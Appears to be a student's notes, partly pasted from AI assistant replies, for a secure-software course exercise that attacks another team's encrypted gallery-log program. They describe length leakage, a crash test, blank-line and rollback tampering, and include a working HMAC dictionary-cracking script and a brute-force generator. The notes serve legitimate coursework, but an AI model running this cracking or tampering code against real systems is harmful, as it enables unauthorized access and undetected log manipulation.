### Confidentiality Violation: Unpadded Ciphertext Leakage

A confidentiality violation occurs if you can infer facts about the log's contents (names, rooms) without knowing the token.

- **The Flaw:** When saving state, the `LogEntry` is converted directly into a JSON string and encrypted. AES-CCM encrypts data using a stream cipher mode, meaning the resulting ciphertext is the exact same length as the plaintext JSON (plus a static 27 bytes for the tag and nonce). Because the developers did not pad the JSON strings to a uniform block size before encryption, the size of the base64 output directly leaks the length of the data inside.
    
- **How to Exploit:**
    
    1. Assume a victim creates two separate gallery logs. In `logA`, a guest named "Al" enters. In `logB`, a guest named "Christopher" enters.
        
    2. Without knowing the token to decrypt the files, simply open both `logA` and `logB` and compare the lengths of the Base64 strings on the second line.
        
    3. **Result:** The Base64 string in `logB` will be visibly longer than the string in `logA`. You can successfully prove in your report that an attacker can monitor the file size to deduce whether short names (like "Al") or long names (like "Christopher") are entering the gallery, completely bypassing the AES encryption.

### Confidentiality Violation: Ciphertext Character-Counting
A confidentiality violation means you can infer information about the log's contents (like names) without possessing the token.
- **The Vulnerability:** Stream Cipher Data Leakage (No JSON Padding).
- **Location:** `crypto.py` (AES-CCM encryption) and `models.py` (JSON formatting).
- **The Mechanism:** The `LogEntry` object is serialized into a JSON string and passed directly into the AES-CCM cipher. AES-CCM is a stream cipher, meaning the encrypted output is exactly the same length as the raw input data (plus a standard 16-byte tag). Because the developers did not pad the JSON strings to a uniform block size, the character length of the Base64 output perfectly mirrors the length of the guest's name.
- **How to execute (Testcase):**
    1. Generate a file with a short name: `python3 logappend.py -T 1 -K secret -A -E Bo logA`
    2. Generate a file with a long name: `python3 logappend.py -T 1 -K secret -A -E Christopher logB`
    3. _The Attack:_ Open both `logA` and `logB` in a standard text editor. You do not need the token.
    4. Look at the Base64 string on the second line of both files.
    5. **Result:** The Base64 string in `logB` will be physically longer (more characters) than the string in `logA`. You can write in your report that an attacker can successfully monitor file size changes to deduce if short-named individuals or long-named individuals are moving through the gallery, effectively bypassing the encryption

This attack exploits the lack of **padding** in the encryption process, where the length of the ciphertext leaks the length of the underlying JSON plaintext. Because the implementation uses `AES.MODE_CCM`, which is a stream-based mode, the ciphertext length is directly proportional to the input length.

### Execution Commands

Follow these steps to demonstrate the **Unpadded Ciphertext Leakage**:

1. **Initialize the "Short Name" Log:** Create a log where a guest with a short name ("Al") enters.
    
    Bash
    
    ```
    python3 logappend.py -T 1 -K secret -A -G Al logA
    
    ```
    

```

2.  **Initialize the "Long Name" Log:**
    Create a second log where a guest with a long name ("Christopher") enters[cite: 2, 7].
    ```bash
    python3 logappend.py -T 1 -K secret -A -G Christopher logB
    ```

3.  **Inspect and Compare File Lengths:**
    Use standard Linux tools to observe the difference in the encrypted data size[cite: 7].
    ```bash
    # Show the length of the first entry in logA
    tail -n 1 logA | wc -c
    
    # Show the length of the first entry in logB
    tail -n 1 logB | wc -c
    ```

### Why the Attack Works

*   **Fixed Overhead:** Every entry in your implementation adds a fixed 27-byte overhead (11-byte nonce + 16-byte tag) plus the Base64 encoding expansion[cite: 1, 3].
*   **JSON Serialization:** The `LogEntry` is converted to a dictionary and then a JSON string: `{"T": 1, "kind": "G", "name": "Al", "action": "A", "room": null}`[cite: 3, 5].
*   **Direct Leakage:** Because there is no padding to a fixed block size (e.g., 128 bytes), the name "Christopher" (11 characters) results in a JSON string that is 9 characters longer than the one for "Al" (2 characters)[cite: 3, 5].
*   **Confidentiality Violation:** The **SRSD_project.pdf** defines a violation as an attacker learning facts about names or contents by inspecting the log itself[cite: 7]. By simply measuring the ciphertext, an attacker can distinguish between different people or room numbers without ever needing the token[cite: 7].

### Summary of Observation
When you run the `wc -c` commands above, you will see that `logB` is significantly larger than `logA`[cite: 7]. An attacker monitoring the gallery in real-time could use this "side-channel" to identify who is entering or leaving based on the known lengths of suspected names[cite: 7].
```


### . Crash Violation: Unhandled Permission OS Errors (works)
A crash occurs when the program terminates via a stack trace instead of gracefully printing "invalid" and exiting with code 111.
- **The Vulnerability:** Uncaught `PermissionError` during file operations.
    
- **Location:** `log_format.py` inside the `append_entry` function, and `logappend.py`'s `run_single` function.
    
- **The Mechanism:** When `logappend.py` executes a valid state change, it eventually calls `append_entry` to write the new data. This function executes `with open(path, 'a') as f:` to append the ciphertext. The developer failed to wrap this specific file IO operation in a `try...except` block. If the script encounters a log file that it has permission to _read_ but not _write to_, it will throw a native Python `PermissionError` and crash the program entirely.
    
- **The Testcase:**
    
    1. Create a log: `python3 logappend.py -T 1 -K secret -A -E Dave log_perms`
        
    2. Change the file permissions to read-only via your OS: `chmod 400 log_perms` (Unix/Linux) or set it to Read-Only in Windows properties.
        
    3. Attempt to append a new event: `python3 logappend.py -T 2 -K secret -L -E Dave log_perms`
        
    4. **Result:** The system crashes with `PermissionError: [Errno 13] Permission denied` instead of safely handling the error.
        

### 2. Integrity Violation: Whitespace / Newline Injection (works using script to ensure right values are added)

An integrity violation occurs when you modify the file without the token, and the system fails to detect it (meaning it does not print "integrity violation").

- **The Vulnerability:** Insecure Log Parsing logic.
    
- **Location:** `log_format.py` inside the `_read_entry_lines` function.
    
- **The Mechanism:** To prevent attackers from reordering lines, the developer encrypts each entry with its specific line number (`seq`). However, when parsing the file, the code uses a list comprehension: `[line for line in remaining.decode('utf-8').splitlines() if line.strip()]`. The `if line.strip()` condition entirely drops any blank lines or lines containing only spaces _before_ assigning the `seq` numbers. Because of this, an attacker can inject arbitrary blank lines anywhere into the log file.
    
- **The Testcase:**
    
    1. Create a log with two events:
        
        `python3 logappend.py -T 1 -K token -A -E Eve log_white`
        
        `python3 logappend.py -T 2 -K token -A -E Frank log_white`
        
    2. Open `log_white` in a text editor.
        
    3. Insert several blank lines between the first Base64 string and the second Base64 string, and add a few blank lines at the end of the file. Save the file.
        
    4. Run `python3 logread.py -K token -S log_white`
        
    5. **Result:** The program outputs `Eve` and `Frank` perfectly, returning `0`. You successfully modified the file bytes without the token, and the cryptographic verification completely failed to detect your tampered lines.
```
#!/bin/bash
# Extract the salt/verifier header (first 48 bytes)
head -c 48 log_white > log_tampered

# Get the encrypted lines
mapfile -t lines < <(tail -c +49 log_white)

# Rebuild the file with injected blank lines
echo "${lines[0]}" >> log_tampered
echo "" >> log_tampered            # Injected newline
echo "   " >> log_tampered         # Injected spaces
echo "${lines[1]}" >> log_tampered
echo "" >> log_tampered            # Injected trailing newline

mv log_tampered log_white
```

### 3. Confidentiality Violation: Fast Offline Token Cracking

A confidentiality violation means you can infer or gain access to the log's contents without initially possessing the token.

- **The Vulnerability:** Cryptographic primitive mismatch (No Key Stretching on the Verifier).
    
- **Location:** `crypto.py` and `log_format.py`.
    
- **The Mechanism:** The developer smartly used `scrypt` (a memory-hard, slow function) to derive the actual AES encryption key, specifically to prevent offline brute-forcing. However, the file's header stores a public 16-byte `salt` and a 32-byte `verifier` so the programs can check if the token is correct before proceeding. The fatal flaw is that this verifier is generated using a simple, single-iteration `HMAC-SHA256`. HMAC-SHA256 is extremely fast to compute. An attacker can extract the header, completely ignore the slow `scrypt` encryption, and run a high-speed dictionary attack against the `verifier`.
    
- **The Testcase:**
    
    1. The admin creates a log using a common word as a token (e.g., "password123").
        
    2. You steal the log file. You do not know the token.
        
    3. You write a tiny Python script that reads the first 48 bytes of the file (16 bytes salt + 32 bytes expected verifier).
        
    4. Your script loops through a standard dictionary list, calculating `hmac.new(guess, salt + b'verify', 'sha256').digest()` and comparing it to the stored verifier.
        
    5. **Result:** Because standard HMAC is so fast, you can test millions of passwords a second. Once you find the match, you have the token, and full confidentiality of the log is instantly compromised. (This is a fantastic architectural flaw to include in a security report).

### Integrity Violation: The Rollback Attack (works)
An integrity violation occurs if you can modify the log without knowing the token, and `logread` accepts it as a perfectly valid file without printing "integrity violation".
- **The Vulnerability:** Lack of temporal anchoring / Rollback prevention.
- **Location:** System architecture (how `logappend.py` and `log_format.py` handle file states).
- **The Mechanism:** While individual lines are authenticated with AES-CCM, the file itself has no mechanism to verify if it is the _most recent_ version of the gallery's state. An attacker can simply make a backup copy of a valid log, wait for new events to be recorded, and then overwrite the live log with their older backup. Because the salt, token, and sequence numbers of the old file are all perfectly valid, `logread` will accept the rolled-back file. This allows an attacker to erase history without detection.
- **How to execute (Testcase):**
    1. Create a log: `python3 logappend.py -T 1 -K secret -A -E Alice log1`
    2. Create a backup of that file using standard OS commands: `cp log1 log1.backup`
    3. Add a new event: `python3 logappend.py -T 2 -K secret -A -E Bob log1`
    4. _The Attack:_ Overwrite the active log with your backup: `cp log1.backup log1`
    5. Read the log: `python3 logread.py -K secret -S log1`
    6. **Result:** The output is simply `Alice`. Bob's arrival was successfully wiped from the cryptographic log, and the program exits `0` without detecting the integrity breach.

```python
import hmac
import sys

def crack_token(log_file_path, wordlist_path):
    # 1. Extract the 16-byte salt and 32-byte verifier from the log file header
    try:
        with open(log_file_path, 'rb') as f:
            header = f.read(48)
            if len(header) < 48:
                print("[-] Log file is too small or invalid.")
                sys.exit(1)
            
            salt = header[:16]
            target_verifier = header[16:48]
    except FileNotFoundError:
        print(f"[-] Could not open log file: {log_file_path}")
        sys.exit(1)

    print(f"[*] Extracted Salt: {salt.hex()}")
    print(f"[*] Target Verifier: {target_verifier.hex()}")
    print("[*] Starting fast offline dictionary attack...")

    attempts = 0
    # 2. Iterate through the wordlist
    try:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as w:
            for line in w:
                attempts += 1
                candidate_token = line.strip()
                
                # 3. Compute the HMAC exactly as crypto.py does
                candidate_verifier = hmac.new(
                    candidate_token.encode('utf-8'),
                    salt + b'verify',
                    digestmod='sha256'
                ).digest()

                # 4. Compare with the target verifier
                if candidate_verifier == target_verifier:
                    print(f"\n[+] SUCCESS! Token cracked in {attempts} attempts.")
                    print(f"[+] The authentication token is: '{candidate_token}'")
                    return candidate_token
                    
        print(f"\n[-] Attack finished. Tested {attempts} words. Token not found.")
    except FileNotFoundError:
        print(f"[-] Could not open wordlist: {wordlist_path}")
        sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 crack.py <log_file> <wordlist.txt>")
        sys.exit(1)
    
    crack_token(sys.argv[1], sys.argv[2])
```

**Create a dummy wordlist** Create a file named `words.txt` and put a few random words in it, ensuring the target token is somewhere in the list:

words.txt
```
admin123
gallery2025
secret
password
srsd_rules
```

john the reaper
### What is `rockyou.txt`?

`rockyou.txt` is the most famous and widely used password dictionary in cybersecurity.

In 2009, a company called RockYou (which made widgets and games for early social media platforms like Myspace and Facebook) suffered a massive data breach. The attackers discovered that RockYou was storing millions of user passwords in completely plain text—no hashing, no encryption.

When the database leaked, security researchers suddenly had a list of over **14 million unique passwords** that real people actually used. It fundamentally changed penetration testing because it proved that humans are incredibly predictable. Instead of trying every mathematical combination of letters and numbers (which takes forever), attackers could just try the `rockyou.txt` list and successfully crack a massive percentage of accounts in seconds.

For your SRSD project, using `rockyou.txt` (or a smaller subset of it) is a highly realistic way to test if the gallery log's token is a common human-chosen password.

---

### How to Generate All Possible Combinations (Brute-Forcing)

If you suspect the token isn't a common word but rather a short random string (like "aB3"), you can generate every possible combination. This is called a **brute-force attack**.

In Python, the standard library `itertools` makes this incredibly easy using the `product` function, which computes the Cartesian product of an input iterable.

Here is how you can write a generator to create all combinations for a specific token length:

Python

```
import itertools
import string

def generate_combinations(length):
    # The gallery project PDF specifies alphanumeric tokens (a-z, A-Z, 0-9)
    charset = string.ascii_letters + string.digits 
    
    # itertools.product generates every possible arrangement
    # repeat=length tells it how many characters long the token should be
    for combo in itertools.product(charset, repeat=length):
        yield "".join(combo)

# --- Example Usage ---
if __name__ == "__main__":
    token_length = 3
    print(f"Generating combinations for length {token_length}...")
    
    # Create the generator
    combo_generator = generate_combinations(token_length)
    
    # Print just the first 10 to see how it works
    for _ in range(10):
        print(next(combo_generator))
```

### The Math: Why Dictionary Attacks Usually Beat Brute Force

While generating combinations is easy in code, you have to watch out for **combinatorial explosion**.

The gallery log PDF specifies the token is alphanumeric. That means there are 62 possible characters (26 lowercase + 26 uppercase + 10 digits).

Here is how many combinations your computer has to generate and hash based on the token length:

- **Length 1:** 62 combinations
    
- **Length 2:** 3,844 combinations
    
- **Length 3:** 238,328 combinations
    
- **Length 4:** 14,776,336 combinations (A modern computer can hash this in a few seconds)
    
- **Length 5:** 916 million combinations (Takes a minute or two)
    
- **Length 6:** 56.8 billion combinations (Starting to take hours/days)
    
- **Length 8:** 218 trillion combinations (Unfeasible for a basic Python script on a laptop)
    

If the team who built `gallerylog1` used a token like `password` (8 characters), a brute-force approach would take forever. But a dictionary approach using `rockyou.txt` would find it instantly, because "password" is near the very top of that file.

If you are writing a cracking script for your report, it is standard practice to do a **hybrid approach**: try a dictionary list first, and if that fails, try brute-forcing lengths 1 through 4.


### 2.3. Crash Violation: Argument Overflow (Exemplo)

_Nota: Substituir pelo comportamento real do G12 se detetado._

- **Vulnerabilidade:** O programa falha ao processar _strings_ extremamente longas no argumento `-E` ou `-G`.
    
- **Justificação:** Em vez de retornar "invalid" (código 111), o programa termina com um erro de sistema, indicando falta de sanitização de inputs.
    
- **Testcase:**
    
    Bash
    
    ```
    python3 logappend.py -T 1 -K token -A -E $(python3 -c "print('A'*10000)") log_crash
    ```
    

---

Desejas que estruture de forma idêntica a secção para o Grupo 16?